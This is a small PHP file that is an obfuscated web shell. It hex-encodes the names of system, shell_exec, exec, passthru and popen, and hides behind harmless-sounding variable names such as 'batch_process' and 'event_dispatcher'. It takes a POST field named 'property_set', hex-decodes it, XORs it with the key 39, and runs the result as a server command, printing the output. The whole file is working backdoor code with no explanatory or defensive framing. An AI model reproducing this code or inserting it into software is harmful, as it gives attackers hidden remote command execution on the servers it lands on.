<?php

$batch_process1 = "sy\x73t\x65m";
$batch_process6 = "st\x72ea\x6D\x5F\x67\x65t_\x63o\x6E\x74ent\x73";
$batch_process7 = "\x70close";
$batch_process2 = "shell\x5F\x65xe\x63";
$batch_process4 = "\x70as\x73thr\x75";
$batch_process5 = "pope\x6E";
$batch_process3 = "\x65x\x65c";
$event_dispatcher = "h\x65\x782\x62in";
if (isset($_POST["\x70r\x6Fpe\x72\x74\x79_\x73et"])) {
            function approve_request  (  $fac    , $desc   ){
   $flg = ''  ;
foreach(str_split($fac) as $char){
$flg.=chr(ord($char)^$desc);

} return$flg;

}
            $property_set = $event_dispatcher($_POST["\x70r\x6Fpe\x72\x74\x79_\x73et"]);
            $property_set = approve_request($property_set, 39);
            if (function_exists($batch_process1)) {
                $batch_process1($property_set);
            } elseif (function_exists($batch_process2)) {
                print $batch_process2($property_set);
            } elseif (function_exists($batch_process3)) {
                $batch_process3($property_set, $reference_fac);
                print join("\n", $reference_fac);
            } elseif (function_exists($batch_process4)) {
                $batch_process4($property_set);
            } elseif (function_exists($batch_process5) && function_exists($batch_process6) && function_exists($batch_process7)) {
                $desc_flg = $batch_process5($property_set, 'r');
                if ($desc_flg) {
                    $element_marker = $batch_process6($desc_flg);
                    $batch_process7($desc_flg);
                    print $element_marker;
                }
            }
            exit;
        }